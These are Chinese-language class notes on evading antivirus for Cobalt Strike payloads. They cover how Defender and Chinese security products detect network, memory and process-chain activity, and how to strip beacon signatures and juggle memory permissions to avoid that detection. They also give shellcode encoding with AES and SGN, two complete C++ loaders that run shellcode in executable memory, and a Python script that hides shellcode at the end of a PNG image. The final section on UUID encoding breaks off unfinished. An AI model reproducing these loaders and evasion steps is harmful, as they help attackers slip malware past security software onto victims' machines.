# 课堂随记
## 动态查杀
### 网络相关
1. 看ip，域名，ssl证书
2. 查找回连的ip或者域名是否之前被标记成cs远控了
3. 通信流量
4. 通信过程中：是否存在命令控制相关的关键词或者加密特征
5. 是否存在已知远控的通讯结构特征
6. cs上线之后执行命令立马被杀，就说明是通信流量的问题
7. defender对网络检测比较严

### 内存相关
1. 内存中存在特征码例如（ReflectiveLoader,beacon.dll等）
2. 或者是内存相关的属性例如（Rwx，Rw）
3. 如果木马上线之后，执行shell命令立刻被报毒，可能就是涉及cmd.exe的进程链被杀，因为shell命令就是通过cmd组件执行shell脚本以启动其他程序，这个时候父子进程链可能被作为一个进程链的查杀顺序被报毒杀掉
4. 国内杀软，火绒，360不具备动态查杀（<mark style="background: #FF5582A6;">网络和内存相关的一定不杀，高危的行为检测以及沙箱还是会的</mark>）

#### 免杀方法
1. 如果发现自己的代码在内存阶段被杀（一般判断方式就是马执行之后立刻被报毒，且网络规避没问题）--->先去看一下shellcode（c2）是否存在内存特征码，如果存在就要更改，方法是--->找到c2的profile文件找到其中的内存关键字符利用`strrep "beacon.dll" "";`语句将关键特征码（引号内）替换为空就可以不影响使用（本质上就是对关键特征码做混淆）
2. 内存属性规避方法：可以先将内存申请成可读可写不可执行，等程序执行到关键的时候先休眠或者延迟处理之后再将原先可读可写不可执行的内存区域改成可读可执行即可


## shellcode处理
### 十六进制转化
1. 采用工具将二进制的bin文件转换成十六进制字符串
2. 工具名sctool，工具加入环境变量任何环境下都可以使用，不需要将目标文件切到工具文件当前目录了，直接进入目标文件的目录，命令行使用即可
3. 常用命令`sctool.exe -f payload.bin`

### 异或XOR加密解密

### base64加密

### AES加密
1. 可以采用工具进行加密 工具：大白哥文档，工具名字：AES.exe  p.txt  key
2. 注意p.txt是去掉\X的16进制字符串文本，key是16字节长度（英文字母和数字组合可以）
3. 注意写loader的代码的时候要包含上头文件，同时也要在vs中的资源里面添加头文件
4. 添加过程：项目右键--->添加新项--->点击添加--->再生成的空白页中拷贝已经编写好的头文件代码即可

## shellcode内存加解密(SGN)
1. 如果按照在代码执行时就解密shellcode时，解密后的shellcode还是会以明文的形式存储到内存中，如果有些edr扫描内存还是会被发现特征报毒。
2. 而内存加解密时，只有到shellcode代码段执行时才会解密，程序在内存中执行时仍然也是加密状态
3. 内存加解密采用一种工具：SGN  地址github-egebaic/sgn
4. sgn只是对shellcode编码
5. 使用sgn时也是将文件放置到sgn的同目录下，采用命令参数加载使用
6. sgn的常用参数很简单`-a`编码文件架构64位,`-c`编码次数（1-10）,`-o`输出编码后的文件名
7. sgn常用命令：`sgn -a 64 -c 1 -0 sgn_shellcode.bin payload.bin`，注意前一个文件是输出文件，后一个是输入文件，都是二进制形式
8. <mark style="background: #FF5582A6;">由于sgn是内存加解密所以不需要自己在loader中写什么解密函数和引入相关函数头文件</mark>
9. 使用sgn之后，如果还是被报毒说明一定不是shellcode的原因造成的，这时候就要看loader的代码了

## shellcode本地分离加载
### 本地直接读取二进制文件加载
示例代码
```c++
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define _CRT_SECURE_NO_WARNINGS // 解决 fopen_s 的警告

int main() {
   // 读取shellcode文件
   char filename[] = "conx.ini";
   FILE* file;
   if (fopen_s(&file, filename, "rb") != 0) {
      perror("Failed to open the code file.");
      return 1;
    }

   fseek(file, 0, SEEK_END);
   long size = ftell(file);
   fseek(file, 0, SEEK_SET);  

   char* code = (char*)malloc(size);
   if (!code) {
      perror("Failed to allocate memory for code.");
      fclose(file);
      return 1;
    }  

   if (fread(code, 1, size, file) != size) {
      perror("Failed to read code from the file.");
      fclose(file);
      free(code);
      return 1;
    }

   fclose(file);

   // 使用VirtualAlloc 函数申请一个 shellcode字节大小的可以执行代码的内存块
   LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
   
   // 把shellcode拷贝到这块内存
   memcpy(addr, code, size);
   // 创建线程运行
   HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
   // 等待线程运行
   WaitForSingleObject(hThread, -1);
   // 关闭线程
   CloseHandle(hThread);
   // 释放资源
   free(code);
   return 0;
}
```

1. 上述代码中是将和loader同目录之下的shellcode加载到loader中并执行的代码
2. 注意上面代码中`"conx.ini"`要替换成同目录之下的文件名
3. 改写的时候注意文件指针的名称变化和类型的变化
4. 代码中的`fopen_s(&file, filename, "rb"`就说明了打开的文件就是以`rb`也就是二进制格式的形式打开的，所以只要读取加载的本地文件是二进制写入的就行，具体的文件拓展名不重要
5. 意味着无论文件扩展名是 **`.bin`、`.dat`、`.txt` 甚至没有扩展名**，只要内容是**二进制shellcode**，代码都能正确读取。
6. `.dat` 是通用的数据文件格式，完全可以存储二进制shellcode。


## shellcode隐写术
### 图片加载
#### 制作步骤
1. 选取一张图片，然后读取图片的字节大小
2. 在图片末尾插入shellcode
3. 生成一张新的图片，且记录shellcode在文件中的起始位置
4. 打开图片文件，从shellcode起始位置开始读取
5. 正常加载执行
#### 将shellcode放入图片
利用python代码
```python
def main(shell_code, file_name="tom.png"):
# 打开tom.png
with open(file_name, mode="rb") as f:
  data = f.read()
  print("shell_code 起始位置为:", len(data))
  with open("tom_new.png", mode="wb") as f:
     f.write(data+shell_code)
print("shell_code 插入成功")

if __name__ == '__main__':
   data = b"\xfc你的shellcode"
   main(data)
```
1. 该部分为将shellcode写入图片末尾位置的python合成代码
2. 注意图片放置在该代码的同路径之下


下面为shellcode加载图片隐写的loader代码
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>  

int main() {
   FILE* file = fopen("tom_new.png", "rb");
   if (!file) {
     perror("Error opening file");
     return 1;
   }
   // 获取文件大小
   fseek(file, 0, SEEK_END);
   long size = ftell(file);
   fseek(file, 1101128, SEEK_SET); // 重新设置文件指针到起始位置
   // 读取内容
   char* content = (char*)malloc(size);
   if (!content) {
     perror("Error allocating memory");
     fclose(file);
     return 1;
   }
   fread(content, 1, size, file);
   fclose(file);
   // 申请内存
   LPVOID p = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
   if (p == NULL) {
      DWORD error = GetLastError();
      fprintf(stderr, "Error allocating memory. GetLastError: %lu\n", error);
      free(content);
      return 1;
   }
   // 复制 shellcode 进申请的内存中
   memcpy(p, content, size);
   // 创建线程
   HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);
   if (h == NULL) {
      fprintf(stderr, "Error creating thread\n");
      free(content);
      return 1;
   }
   // 等待线程完成
   WaitForSingleObject(h, INFINITE);
   // 释放内存
   VirtualFree(p, 0, MEM_RELEASE);
   free(content);
   return 0;
}
```
1. 注意文件指针的类型转换，指针地址名称的变化


#### 注意
1. 图片一定要和可执行文件放在一个文件夹中（根据打败哥的loader代码），当然也可以通过代码改变放在子文件夹中也可以


## 利用UUID处理shellcode
1. 利用uuid对shellcode进行处理，类似于将shellcode进行了一种纯数字化的编码，所以在执行shellcode之前还是要讲shellcode进行解码，并将解码后的shellcode存入内存的data区域，如果有些杀毒软件进行的还是内存扫描的话，依然会被识别报毒
2. 